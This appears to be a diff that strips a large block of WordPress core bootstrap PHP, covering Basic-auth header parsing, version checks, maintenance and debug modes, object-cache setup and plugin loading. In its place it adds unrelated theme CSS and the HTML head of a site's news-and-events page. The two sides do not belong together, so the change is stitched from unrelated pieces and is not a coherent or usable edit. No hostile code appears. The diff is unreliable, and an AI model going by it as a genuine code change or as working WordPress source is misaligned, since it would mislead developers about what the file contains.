-	// Removing `Basic ` the token would start six characters in.
-	$token    = substr( $header, 6 );
-	$userpass = base64_decode( $token );
-
-	// There must be at least one colon in the string.
-	if ( ! str_contains( $userpass, ':' ) ) {
-		return;
-	}
-
-	list( $user, $pass ) = explode( ':', $userpass, 2 );
-
-	// Now shove them in the proper keys where we're expecting later on.
-	$_SERVER['PHP_AUTH_USER'] = $user;
-	$_SERVER['PHP_AUTH_PW']   = $pass;
+.vamtam-box-outer-padding,
+.limit-wrapper,
+.header-padding {
+	padding-left: 0;
+	padding-right: 0;
 }
 
-/**
- * Checks for the required PHP version, and the mysqli extension or
- * a database drop-in.
- *
- * Dies if requirements are not met.
- *
- * @since 3.0.0
- * @access private
- *
- * @global string $required_php_version The required PHP version string.
- * @global string $wp_version           The WordPress version string.
- */
-function wp_check_php_mysql_versions() {
-	global $required_php_version, $wp_version;
+.vamtam-box-outer-padding .vamtam-box-outer-padding,
+.limit-wrapper .limit-wrapper,
+.elementor .limit-wrapper {
+	padding-left: 0;
+	padding-right: 0;
+	margin-left: 0;
+	margin-right: 0;
+}
 
-	$php_version = PHP_VERSION;
-
-	if ( version_compare( $required_php_version, $php_version, '>' ) ) {
-		$protocol = wp_get_server_protocol();
-		header( sprintf( '%s 500 Internal Server Error', $protocol ), true, 500 );
-		header( 'Content-Type: text/html; charset=utf-8' );
-		printf(
-			'Your server is running PHP version %1$s but WordPress %2$s requires at least %3$s.',
-			$php_version,
-			$wp_version,
-			$required_php_version
-		);
-		exit( 1 );
-	}
-
-	// This runs before default constants are defined, so we can't assume WP_CONTENT_DIR is set yet.
-	$wp_content_dir = defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content';
-
-	if ( ! function_exists( 'mysqli_connect' )
-		&& ! file_exists( $wp_content_dir . '/db.php' )
-	) {
-		require_once ABSPATH . WPINC . '/functions.php';
-		wp_load_translations_early();
-
-		$message = '<p>' . __( 'Your PHP installation appears to be missing the MySQL extension which is required by WordPress.' ) . "</p>\n";
-
-		$message .= '<p>' . sprintf(
-			/* translators: %s: mysqli. */
-			__( 'Please check that the %s PHP extension is installed and enabled.' ),
-			'<code>mysqli</code>'
-		) . "</p>\n";
-
-		$message .= '<p>' . sprintf(
-			/* translators: %s: Support forums URL. */
-			__( 'If you are unsure what these terms mean you should probably contact your host. If you still need help you can always visit the <a href="%s">WordPress support forums</a>.' ),
-			__( 'https://wordpress.org/support/forums/' )
-		) . "</p>\n";
-
-		$args = array(
-			'exit' => false,
-			'code' => 'mysql_not_found',
-		);
-		wp_die(
-			$message,
-			__( 'Requirements Not Met' ),
-			$args
-		);
-		exit( 1 );
+@media ( min-width: 1026px ) and ( max-width: 1260px ) {
+	.vamtam-box-outer-padding,
+	.limit-wrapper,
+	.header-padding {
+		padding-left: 40px;
+		padding-right: 40px;
 	}
 }
 
-/**
- * Retrieves the current environment type.
- *
- * The type can be set via the `WP_ENVIRONMENT_TYPE` global system variable,
- * or a constant of the same name.
- *
- * Possible values are 'local', 'development', 'staging', and 'production'.
- * If not set, the type defaults to 'production'.
- *
- * @since 5.5.0
- * @since 5.5.1 Added the 'local' type.
- * @since 5.5.1 Removed the ability to alter the list of types.
- *
- * @return string The current environment type.
- */
-function wp_get_environment_type() {
-	static $current_env = '';
-
-	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && $current_env ) {
-		return $current_env;
-	}
-
-	$wp_environments = array(
-		'local',
-		'development',
-		'staging',
-		'production',
-	);
-
-	// Add a note about the deprecated WP_ENVIRONMENT_TYPES constant.
-	if ( defined( 'WP_ENVIRONMENT_TYPES' ) && function_exists( '_deprecated_argument' ) ) {
-		if ( function_exists( '__' ) ) {
-			/* translators: %s: WP_ENVIRONMENT_TYPES */
-			$message = sprintf( __( 'The %s constant is no longer supported.' ), 'WP_ENVIRONMENT_TYPES' );
-		} else {$message = sprintf( 'The %s constant is no longer supported.', 'WP_ENVIRONMENT_TYPES' );
-		}
-
-		_deprecated_argument(
-			'define()',
-			'5.5.1',
-			$message
-		);
-	}
-
-	// Check if the environment variable has been set, if `getenv` is available on the system.
-	if ( function_exists( 'getenv' ) ) {
-		$has_env = getenv( 'WP_ENVIRONMENT_TYPE' );
-		if ( false !== $has_env ) {
-			$current_env = $has_env;
-		}
-	}
-
-	// Fetch the environment from a constant, this overrides the global system variable.
-	if ( defined( 'WP_ENVIRONMENT_TYPE' ) && WP_ENVIRONMENT_TYPE ) {
-		$current_env = WP_ENVIRONMENT_TYPE;
-	}
-
-	// Make sure the environment is an allowed one, and not accidentally set to an invalid value.
-	if ( ! in_array( $current_env, $wp_environments, true ) ) {
-		$current_env = 'production';
-	}
-
-	return $current_env;
-}
-
-/**
- * Retrieves the current development mode.
- *
- * The development mode affects how certain parts of the WordPress application behave,
- * which is relevant when developing for WordPress.
- *
- * Development mode can be set via the `WP_DEVELOPMENT_MODE` constant in `wp-config.php`.
- * Possible values are 'core', 'plugin', 'theme', 'all', or an empty string to disable
- * development mode. 'all' is a special value to signify that all three development modes
- * ('core', 'plugin', and 'theme') are enabled.
- *
- * Development mode is considered separately from `WP_DEBUG` and wp_get_environment_type().
- * It does not affect debugging output, but rather functional nuances in WordPress.
- *
- * This function retrieves the currently set development mode value. To check whether
- * a specific development mode is enabled, use wp_is_development_mode().
- *
- * @since 6.3.0
- *
- * @return string The current development mode.
- */
-function wp_get_development_mode() {
-	static $current_mode = null;
-
-	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && null !== $current_mode ) {
-		return $current_mode;
-	}
-
-	$development_mode = WP_DEVELOPMENT_MODE;
-
-	// Exclusively for core tests, rely on the `$_wp_tests_development_mode` global.
-	if ( defined( 'WP_RUN_CORE_TESTS' ) && isset( $GLOBALS['_wp_tests_development_mode'] ) ) {
-		$development_mode = $GLOBALS['_wp_tests_development_mode'];
-	}
-
-	$valid_modes = array(
-		'core',
-		'plugin',
-		'theme',
-		'all',
-		'',
-	);
-
-	if ( ! in_array( $development_mode, $valid_modes, true ) ) {
-		$development_mode = '';
-	}
-
-	$current_mode = $development_mode;
-
-	return $current_mode;
-}
-
-/**
- * Checks whether the site is in the given development mode.
- *
- * @since 6.3.0
- *
- * @param string $mode Development mode to check for. Either 'core', 'plugin', 'theme', or 'all'.
- * @return bool True if the given mode is covered by the current development mode, false otherwise.
- */
-function wp_is_development_mode( $mode ) {
-	$current_mode = wp_get_development_mode();
-	if ( empty( $current_mode ) ) {
-		return false;
-	}
-
-	// Return true if the current mode encompasses all modes.
-	if ( 'all' === $current_mode ) {
-		return true;
-	}
-
-	// Return true if the current mode is the given mode.
-	return $mode === $current_mode;
-}
-
-/**
- * Ensures all of WordPress is not loaded when handling a favicon.ico request.
- *
- * Instead, send the headers for a zero-length favicon and bail.
- *
- * @since 3.0.0
- * @deprecated 5.4.0 Deprecated in favor of do_favicon().
- */
-function wp_favicon_request() {
-	if ( '/favicon.ico' === $_SERVER['REQUEST_URI'] ) {
-		header( 'Content-Type: image/vnd.microsoft.icon' );
-		exit;
+@media ( max-width: 1025px ) {
+	.vamtam-box-outer-padding,
+	.limit-wrapper,
+	.header-padding {
+		padding-left: 30px;
+		padding-right: 30px;
 	}
 }
 
-/**
- * Dies with a maintenance message when conditions are met.
- *
- * The default message can be replaced by using a drop-in (maintenance.php in
- * the wp-content directory).
- *
- * @since 3.0.0
- * @access private
- */
-function wp_maintenance() {
-	// Return if maintenance mode is disabled.
-	if ( ! wp_is_maintenance_mode() ) {
-		return;
-	}
-
-	if ( file_exists( WP_CONTENT_DIR . '/maintenance.php' ) ) {
-		require_once WP_CONTENT_DIR . '/maintenance.php';
-		die();
-	}
-
-	require_once ABSPATH . WPINC . '/functions.php';
-	wp_load_translations_early();
-
-	header( 'Retry-After: 600' );
-
-	wp_die(
-		__( 'Briefly unavailable for scheduled maintenance. Check back in a minute.' ),
-		__( 'Maintenance' ),
-		503
-	);
-}
-
-/**
- * Checks if maintenance mode is enabled.
- *
- * Checks for a file in the WordPress root directory named ".maintenance".
- * This file will contain the variable $upgrading, set to the time the file
- * was created. If the file was created less than 10 minutes ago, WordPress
- * is in maintenance mode.
- *
- * @since 5.5.0
- *
- * @global int $upgrading The Unix timestamp marking when upgrading WordPress began.
- *
- * @return bool True if maintenance mode is enabled, false otherwise.
- */
-function wp_is_maintenance_mode() {
-	global $upgrading;
-
-	if ( ! file_exists( ABSPATH . '.maintenance' ) || wp_installing() ) {
-		return false;
-	}
-
-	require ABSPATH . '.maintenance';
-
-	// If the $upgrading timestamp is older than 10 minutes, consider maintenance over.
-	if ( ( time() - $upgrading ) >= 10 * MINUTE_IN_SECONDS ) {
-		return false;
-	}
-
-	// Don't enable maintenance mode while scraping for fatal errors.
-	if ( is_int( $upgrading ) && isset( $_REQUEST['wp_scrape_key'], $_REQUEST['wp_scrape_nonce'] ) ) {
-		$key   = stripslashes( $_REQUEST['wp_scrape_key'] );
-		$nonce = stripslashes( $_REQUEST['wp_scrape_nonce'] );
-
-		if ( md5( $upgrading ) === $key && (int) $nonce === $upgrading ) {
-			return false;
-		}
-	}
-
-	/**
-	 * Filters whether to enable maintenance mode.
-	 *
-	 * This filter runs before it can be used by plugins. It is designed for
-	 * non-web runtimes. If this filter returns true, maintenance mode will be
-	 * active and the request will end. If false, the request will be allowed to
-	 * continue processing even if maintenance mode should be active.
-	 *
-	 * @since 4.6.0
-	 *
-	 * @param bool $enable_checks Whether to enable maintenance mode. Default true.
-	 * @param int  $upgrading     The timestamp set in the .maintenance file.
-	 */
-	if ( ! apply_filters( 'enable_maintenance_mode', true, $upgrading ) ) {
-		return false;
-	}
-
-	return true;
-}
-
-/**
- * Gets the time elapsed so far during this PHP script.
- *
- * @since 5.8.0
- *
- * @return float Seconds since the PHP script started.
- */
-function timer_float() {
-	return microtime( true ) - $_SERVER['REQUEST_TIME_FLOAT'];
-}
-
-/**
- * Starts the WordPress micro-timer.
- *
- * @since 0.71
- * @access private
- *
- * @global float $timestart Unix timestamp set at the beginning of the page load.
- * @see timer_stop()
- *
- * @return bool Always returns true.
- */
-function timer_start() {
-	global $timestart;
-
-	$timestart = microtime( true );
-
-	return true;
-}
-
-/**
- * Retrieves or displays the time from the page start to when function is called.
- *
- * @since 0.71
- *
- * @global float   $timestart Seconds from when timer_start() is called.
- * @global float   $timeend   Seconds from when function is called.
- *
- * @param int|bool $display   Whether to echo or return the results. Accepts 0|false for return,
- *                            1|true for echo. Default 0|false.
- * @param int      $precision The number of digits from the right of the decimal to display.
- *                            Default 3.
- * @return string The "second.microsecond" finished time calculation. The number is formatted
- *                for human consumption, both localized and rounded.
- */
-function timer_stop( $display = 0, $precision = 3 ) {
-	global $timestart, $timeend;
-
-	$timeend   = microtime( true );
-	$timetotal = $timeend - $timestart;
-
-	if ( function_exists( 'number_format_i18n' ) ) {
-		$r = number_format_i18n( $timetotal, $precision );
-	} else {
-		$r = number_format( $timetotal, $precision );
-	}
-
-	if ( $display ) {
-		echo $r;
-	}
-
-	return $r;
-}
-
-/**
- * Sets PHP error reporting based on WordPress debug settings.
- *
- * Uses three constants: `WP_DEBUG`, `WP_DEBUG_DISPLAY`, and `WP_DEBUG_LOG`.
- * All three can be defined in wp-config.php. By default, `WP_DEBUG` and
- * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
- *
- * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
- * display internal notices: when a deprecated WordPress function, function
- * argument, or file is used. Deprecated code may be removed from a later
- * version.
- *
- * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
- * in their development environments.
- *
- * `WP_DEBUG_DISPLAY` and `WP_DEBUG_LOG` perform no function unless `WP_DEBUG`
- * is true.
- *
- * When `WP_DEBUG_DISPLAY` is true, WordPress will force errors to be displayed.
- * `WP_DEBUG_DISPLAY` defaults to true. Defining it as null prevents WordPress
- * from changing the global configuration setting. Defining `WP_DEBUG_DISPLAY`
- * as false will force errors to be hidden.
- *
- * When `WP_DEBUG_LOG` is true, errors will be logged to `wp-content/debug.log`.
- * When `WP_DEBUG_LOG` is a valid path, errors will be logged to the specified file.
- *
- * Errors are never displayed for XML-RPC, REST, `ms-files.php`, andAjaxrequests.
- *
- * @since 3.0.0
- * @since 5.1.0 `WP_DEBUG_LOG` can be a file path.
- * @access private
- */
-function wp_debug_mode() {
-	/**
-	 * Filters whether to allow the debug mode check to occur.
-	 *
-	 * This filter runs before it can be used by plugins. It is designed for
-	 * non-web runtimes. Returning false causes the `WP_DEBUG` and related
-	 * constants to not be checked and the default PHP values for errors
-	 * will be used unless you take care to update them yourself.
-	 *
-	 * To use this filter you must define a `$wp_filter` global before
-	 * WordPress loads, usually in `wp-config.php`.
-	 *
-	 * Example:
-	 *
-	 *     $GLOBALS['wp_filter'] = array(
-	 *         'enable_wp_debug_mode_checks' => array(
-	 *             10 => array(
-	 *                 array(
-	 *                     'accepted_args' => 0,
-	 *                     'function'      => function() {
-	 *                         return false;
-	 *                     },
-	 *                 ),
-	 *             ),
-	 *         ),
-	 *     );
-	 *
-	 * @since 4.6.0
-	 *
-	 * @param bool $enable_debug_mode Whether to enable debug mode checks to occur. Default true.
-	 */
-	if ( ! apply_filters( 'enable_wp_debug_mode_checks', true ) ) {
-		return;
-	}
-
-	if ( WP_DEBUG ) {
-		error_reporting( E_ALL );
-
-		if ( WP_DEBUG_DISPLAY ) {
-			ini_set( 'display_errors', 1 );
-		} elseif ( null !== WP_DEBUG_DISPLAY ) {
-			ini_set( 'display_errors', 0 );
-		}
-
-		if ( in_array( strtolower( (string) WP_DEBUG_LOG ), array( 'true', '1' ), true ) ) {
-			$log_path = WP_CONTENT_DIR . '/debug.log';
-		} elseif ( is_string( WP_DEBUG_LOG ) ) {
-			$log_path = WP_DEBUG_LOG;
-		} else {
-			$log_path = false;
-		}
-
-		if ( $log_path ) {
-			ini_set( 'log_errors', 1 );
-			ini_set( 'error_log', $log_path );
-		}
-	} else {
-		error_reporting( E_CORE_ERROR | E_CORE_WARNING | E_COMPILE_ERROR | E_ERROR | E_WARNING | E_PARSE | E_USER_ERROR | E_USER_WARNING | E_RECOVERABLE_ERROR );
-	}
-
-	/*
-	 * The 'REST_REQUEST' check here is optimistic as the constant is most
-	 * likely not set at this point even if it is in fact a REST request.
-	 */
-	if ( defined( 'XMLRPC_REQUEST' ) || defined( 'REST_REQUEST' ) || defined( 'MS_FILES_REQUEST' )
-		|| ( defined( 'WP_INSTALLING' ) && WP_INSTALLING )
-		|| wp_doing_ajax() || wp_is_json_request()
-	) {
-		ini_set( 'display_errors', 0 );
+@media ( max-width: 430px ) {
+	.vamtam-box-outer-padding,
+	.limit-wrapper,
+	.header-padding {
+		padding-left: 20px;
+		padding-right: 20px;
 	}
 }
 
-/**
- * Sets the location of the language directory.
- *
- * To set directory manually, define the `WP_LANG_DIR` constant
- * in wp-config.php.
- *
- * If the language directory exists within `WP_CONTENT_DIR`, it
- * is used. Otherwise the language directory is assumed to live
- * in `WPINC`.
- *
- * @since 3.0.0
- * @access private
- */
-function wp_set_lang_dir() {
-	if ( ! defined( 'WP_LANG_DIR' ) ) {
-		if ( file_exists( WP_CONTENT_DIR . '/languages' ) && @is_dir( WP_CONTENT_DIR . '/languages' )
-			|| ! @is_dir( ABSPATH . WPINC . '/languages' )
-		) {
-			/**
-			 * Server path of the language directory.
-			 *
-			 * No leading slash, no trailing slash, full path, not relative to ABSPATH
-			 *
-			 * @since 2.1.0
-			 */
-			define( 'WP_LANG_DIR', WP_CONTENT_DIR . '/languages' );
 
-			if ( ! defined( 'LANGDIR' ) ) {
-				// Old static relative path maintained for limited backward compatibility - won't work in some cases.
-				define( 'LANGDIR', 'wp-content/languages' );
-			}
-		} else {
-			/**
-			 * Server path of the language directory.
-			 *
-			 * No leading slash, no trailing slash, full path, not relative to `ABSPATH`.
-			 *
-			 * @since 2.1.0
-			 */
-			define( 'WP_LANG_DIR', ABSPATH . WPINC . '/languages' );
-
-			if ( ! defined( 'LANGDIR' ) ) {
-				// Old relative path maintained for backward compatibility.
-				define( 'LANGDIR', WPINC . '/languages' );
-			}
-		}
-	}
-}
-
-/**
- * Loads the database class file and instantiates the `$wpdb` global.
- *
- * @since 2.5.0
- *
- * @global wpdb $wpdb WordPress database abstraction object.
- */
-function require_wp_db() {
-	global $wpdb;
-
-	require_once ABSPATH . WPINC . '/class-wpdb.php';
-
-	if ( file_exists( WP_CONTENT_DIR . '/db.php' ) ) {
-		require_once WP_CONTENT_DIR . '/db.php';
-	}
-
-	if ( isset( $wpdb ) ) {
-		return;
-	}
-
-	$dbuser     = defined( 'DB_USER' ) ? DB_USER : '';
-	$dbpassword = defined( 'DB_PASSWORD' ) ? DB_PASSWORD : '';
-	$dbname     = defined( 'DB_NAME' ) ? DB_NAME : '';
-	$dbhost     = defined( 'DB_HOST' ) ? DB_HOST : '';
-
-	$wpdb = new wpdb( $dbuser, $dbpassword, $dbname, $dbhost );
-}
-
-/**
- * Sets the database table prefix and the format specifiers for database
- * table columns.
- *
- * Columns not listed here default to `%s`.
- *
- * @since 3.0.0
- * @access private
- *
- * @global wpdb   $wpdb         WordPress database abstraction object.
- * @global string $table_prefix The database table prefix.
- */
-function wp_set_wpdb_vars() {
-	global $wpdb, $table_prefix;
-
-	if ( ! empty( $wpdb->error ) ) {
-		dead_db();
-	}
-
-	$wpdb->field_types = array(
-		'post_author'      => '%d',
-		'post_parent'      => '%d',
-		'menu_order'       => '%d',
-		'term_id'          => '%d',
-		'term_group'       => '%d',
-		'term_taxonomy_id' => '%d',
-		'parent'           => '%d',
-		'count'            => '%d',
-		'object_id'        => '%d',
-		'term_order'       => '%d',
-		'ID'               => '%d',
-		'comment_ID'       => '%d',
-		'comment_post_ID'  => '%d',
-		'comment_parent'   => '%d',
-		'user_id'          => '%d',
-		'link_id'          => '%d',
-		'link_owner'       => '%d',
-		'link_rating'      => '%d',
-		'option_id'        => '%d',
-		'blog_id'          => '%d',
-		'meta_id'          => '%d',
-		'post_id'          => '%d',
-		'user_status'      => '%d',
-		'umeta_id'         => '%d',
-		'comment_karma'    => '%d',
-		'comment_count'    => '%d',
-		// Multisite:
-		'active'           => '%d',
-		'cat_id'           => '%d',
-		'deleted'          => '%d',
-		'lang_id'          => '%d',
-		'mature'           => '%d',
-		'public'           => '%d',
-		'site_id'          => '%d',
-		'spam'             => '%d',
-	);
-
-	$prefix = $wpdb->set_prefix( $table_prefix );
-
-	if ( is_wp_error( $prefix ) ) {
-		wp_load_translations_early();
-		wp_die(
-			sprintf(
-				/* translators: 1: $table_prefix, 2: wp-config.php */
-				__( '<strong>Error:</strong> %1$s in %2$s can only contain numbers, letters, and underscores.' ),
-				'<code>$table_prefix</code>',
-				'<code>wp-config.php</code>'
-			)
-		);
-	}
-}
-
-/**
- * Toggles `$_wp_using_ext_object_cache` on and off without directly
- * touching global.
- *
- * @since 3.7.0
- *
- * @global bool $_wp_using_ext_object_cache
- *
- * @param bool $using Whether external object cache is being used.
- * @return bool The current 'using' setting.
- */
-function wp_using_ext_object_cache( $using = null ) {
-	global $_wp_using_ext_object_cache;
-
-	$current_using = $_wp_using_ext_object_cache;
-
-	if ( null !== $using ) {
-		$_wp_using_ext_object_cache = $using;
-	}
-
-	return $current_using;
-}
-
-/**
- * Starts the WordPress object cache.
- *
- * If an object-cache.php file exists in the wp-content directory,
- * it uses that drop-in as an external object cache.
- *
- * @since 3.0.0
- * @access private
- *
- * @global array $wp_filter Stores all of the filters.
- */
-function wp_start_object_cache() {
-	global $wp_filter;
-	static $first_init = true;
-
-	// Only perform the following checks once.
-
-	/**
-	 * Filters whether to enable loading of the object-cache.php drop-in.
-	 *
-	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If false is returned, object-cache.php will never be loaded.
-	 *
-	 * @since 5.8.0
-	 *
-	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
-	 *                                  Default true.
-	 */
-	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
-		if ( ! function_exists( 'wp_cache_init' ) ) {
-			/*
-			 * This is the normal situation. First-run of this function. No
-			 * caching backend has been loaded.
-			 *
-			 * We try to load a custom caching backend, and then, if it
-			 * results in a wp_cache_init() function existing, we note
-			 * that an external object cache is being used.
-			 */
-			if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
-				require_once WP_CONTENT_DIR . '/object-cache.php';
-
-				if ( function_exists( 'wp_cache_init' ) ) {
-					wp_using_ext_object_cache( true);}
-
-				// Re-initialize any hooks added manually by object-cache.php.
-				if ( $wp_filter ) {
-					$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
+</style>
+<link rel='stylesheet' id='vamtam-theme-layout-max-low-css' href='https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/css/dist/responsive/layout-max-low.css?ver=1729494426' type='text/css' media='(min-width: 1025px) and (max-width: 1260px)' />
+<link rel='stylesheet' id='vamtam-theme-layout-max-css' href='https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/css/dist/responsive/layout-max.css?ver=1729494426' type='text/css' media='(min-width: 1025px)' />
+<link rel='stylesheet' id='vamtam-theme-layout-below-max-css' href='https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/css/dist/responsive/layout-below-max.css?ver=1729494426' type='text/css' media='(max-width: 1024px)' />
+<link rel='stylesheet' id='vamtam-theme-layout-small-css' href='https://amab.com.qa/wp-content/themes/estudiar/vamtam/assets/css/dist/responsive/layout-small.css?ver=1729494426' type='text/css' media='(max-width: 429px)' />
+<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Work+Sans%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CInter%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=swap&#038;ver=6.7.1' type='text/css' media='all' />
+<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><script type="text/javascript" src="https://amab.com.qa/wp-includes/js/jquery/jquery.min.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.4.1" id="jquery-migrate-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor-pro/assets/js/page-transitions.min.js?ver=3.20.3" id="page-transitions-js"></script>
+<script type="text/javascript" src="https://amab.com.qa/wp-content/plugins/elementor/assets/lib/font-awesome/js/v4-shims.min.js?ver=3.26.4" id="font-awesome-4-shim-js"></script>
+<link rel="https://api.w.org/" href="https://amab.com.qa/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://amab.com.qa/wp-json/wp/v2/pages/992016" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://amab.com.qa/xmlrpc.php?rsd" />
+<meta name="generator" content="WordPress 6.7.1" />
+<link rel="canonical" href="https://amab.com.qa/news-and-events/" />
+<link rel='shortlink' href='https://amab.com.qa/?p=992016' />
+<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://amab.com.qa/wp-json/oembed/1.0/embed?url=https%3A%2F%2Famab.com.qa%2Fnews-and-events%2F" />
+<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://amab.com.qa/wp-json/oembed/1.0/embed?url=https%3A%2F%2Famab.com.qa%2Fnews-and-events%2F&#038;format=xml" />
+<link rel="alternate" hreflang="en-US" href="https://amab.com.qa/news-and-events/"/>
+<link rel="alternate" hreflang="ar" href="https://amab.com.qa/ar/news-and-events/"/>
+<link rel="alternate" hreflang="en" href="https://amab.com.qa/news-and-events/"/>
+<meta name="generator" content="Elementor 3.26.4; features: e_font_icon_svg; settings: css_print_method-external, google_font-enabled, font_display-swap">
+			<style>
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
+				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
+					background-image: none !important;
 				}
-			}
-		} elseif ( ! wp_using_ext_object_cache() && file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
-			/*
-			 * Sometimes advanced-cache.php can load object-cache.php before
-			 * this function is run. This breaks the function_exists() check
-			 * above and can result in wp_using_ext_object_cache() returning
-			 * false when actually an external cache is in use.
-			 */
-			wp_using_ext_object_cache( true );
-		}
-	}
-
-	if ( ! wp_using_ext_object_cache() ) {
-		require_once ABSPATH . WPINC . '/cache.php';
-	}
-
-	require_once ABSPATH . WPINC . '/cache-compat.php';
-
-	/*
-	 * If cache supports reset, reset instead of init if already
-	 * initialized. Reset signals to the cache that global IDs
-	 * have changed and it may need to update keys and cleanup caches.
-	 */
-	if ( ! $first_init && function_exists( 'wp_cache_switch_to_blog' ) ) {
-		wp_cache_switch_to_blog( get_current_blog_id() );
-	} elseif ( function_exists( 'wp_cache_init' ) ) {
-		wp_cache_init();
-	}
-
-	if ( function_exists( 'wp_cache_add_global_groups' ) ) {
-		wp_cache_add_global_groups(
-			array(
-				'blog-details',
-				'blog-id-cache',
-				'blog-lookup',
-				'blog_meta',
-				'global-posts',
-				'image_editor',
-				'networks',
-				'network-queries',
-				'sites',
-				'site-details',
-				'site-options',
-				'site-queries',
-				'site-transient',
-				'theme_files',
-				'translation_files',
-				'rss',
-				'users',
-				'user-queries',
-				'user_meta',
-				'useremail',
-				'userlogins',
-				'userslugs',
-			)
-		);
-
-		wp_cache_add_non_persistent_groups( array( 'counts', 'plugins', 'theme_json' ) );
-	}
-
-	$first_init = false;
-}
-
-/**
- * Redirects to the installer if WordPress is not installed.
- *
- * Dies with an error message when Multisite is enabled.
- *
- * @since 3.0.0
- * @access private
- */
-function wp_not_installed() {
-	if ( is_blog_installed() || wp_installing() ) {
-		return;
-	}
-
-	nocache_headers();
-
-	if ( is_multisite() ) {
-		wp_die( __( 'The site you have requested is not installed properly. Please contact the system administrator.' ) );
-	}
-
-	require ABSPATH . WPINC . '/kses.php';
-	require ABSPATH . WPINC . '/pluggable.php';
-
-	$link = wp_guess_url() . '/wp-admin/install.php';
-
-	wp_redirect( $link );
-	die();
-}
-
-/**
- * Retrieves an array of must-use plugin files.
- *
- * The default directory is wp-content/mu-plugins. To change the default
- * directory manually, define `WPMU_PLUGIN_DIR` and `WPMU_PLUGIN_URL`
- * in wp-config.php.
- *
- * @since 3.0.0
- * @access private
- *
- * @return string[] Array of absolute paths of files to include.
- */
-function wp_get_mu_plugins() {
-	$mu_plugins = array();
-
-	if ( ! is_dir( WPMU_PLUGIN_DIR ) ) {
-		return $mu_plugins;
-	}
-
-	$dh = opendir( WPMU_PLUGIN_DIR );
-	if ( ! $dh ) {
-		return $mu_plugins;
-	}
-
-	while ( ( $plugin = readdir( $dh ) ) !== false ) {
-		if ( str_ends_with( $plugin, '.php' ) ) {
-			$mu_plugins[] = WPMU_PLUGIN_DIR . '/' . $plugin;
-		}
-	}
-
-	closedir( $dh );
-
-	sort( $mu_plugins );
-
-	return $mu_plugins;
-}
-
-/**
- * Retrieves an array of active and valid plugin files.
- *
- * While upgrading or installing WordPress, no plugins are returned.
- *
- * The default directory is `wp-content/plugins`. To change the default
- * directory manually, define `WP_PLUGIN_DIR` and `WP_PLUGIN_URL`
- * in `wp-config.php`.
- *
- * @since 3.0.0
- * @access private
- *
- * @return string[] Array of paths to plugin files relative to the plugins directory.
- */
-function wp_get_active_and_valid_plugins() {
-	$plugins        = array();
-	$active_plugins = (array) get_option( 'active_plugins', array() );
-
-	// Check for hacks file if the option is enabled.
-	if ( get_option( 'hack_file' ) && file_exists( ABSPATH . 'my-hacks.php' ) ) {
-		_deprecated_file( 'my-hacks.php', '1.5.0' );
-		array_unshift( $plugins, ABSPATH . 'my-hacks.php' );
-	}
-
-	if ( empty( $active_plugins ) || wp_installing() ) {
-		return $plugins;
-	}
-
-	$network_plugins = is_multisite() ? wp_get_active_network_plugins() : false;
-
-	foreach ( $active_plugins as $plugin ) {
-		if ( ! validate_file( $plugin )                     // $plugin must validate as file.
-			&& str_ends_with( $plugin, '.php' )             // $plugin must end with '.php'.
-			&& file_exists( WP_PLUGIN_DIR . '/' . $plugin ) // $plugin must exist.
-			// Not already included as a network plugin.
-			&& ( ! $network_plugins || ! in_array( WP_PLUGIN_DIR . '/' . $plugin, $network_plugins, true ) )
-		) {
-			$plugins[] = WP_PLUGIN_DIR . '/' . $plugin;
-		}
-	}
-
-	/*
-	 * Remove plugins from the list of active plugins when we're on an endpoint
-	 * that should be protected against WSODs and the plugin is paused.
-	 */
-	if ( wp_is_recovery_mode() ) {
-		$plugins = wp_skip_paused_plugins( $plugins );
-	}
-
-	return $plugins;
-}
-
-/**
- * Filters a given list of plugins, removing any paused plugins from it.
- *
- * @since 5.2.0
- *
- * @global WP_Paused_Extensions_Storage $_paused_plugins
- *
- * @param string[] $plugins Array of absolute plugin main file paths.
- * @return string[] Filtered array of plugins, without any paused plugins.
- */
-function wp_skip_paused_plugins( array $plugins ) {
-	$paused_plugins = wp_paused_plugins()->get_all();
-
-	if ( empty( $paused_plugins ) ) {
-		return $plugins;
-	}
-
-	foreach ( $plugins as $index => $plugin ) {
-		list( $plugin ) = explode( '/', plugin_basename( $plugin ) );
-
-		if ( array_key_exists( $plugin, $paused_plugins ) ) {
-			unset( $plugins[ $index ] );
-
-			// Store list of paused plugins for displaying an admin notice.
-			$GLOBALS['_paused_plugins'][ $plugin ] = $paused_plugins[ $plugin ];
-		}
-	}
-
-	return $plugins;
-}
-
-/**
- * Retrieves an array of active and valid themes.
- *
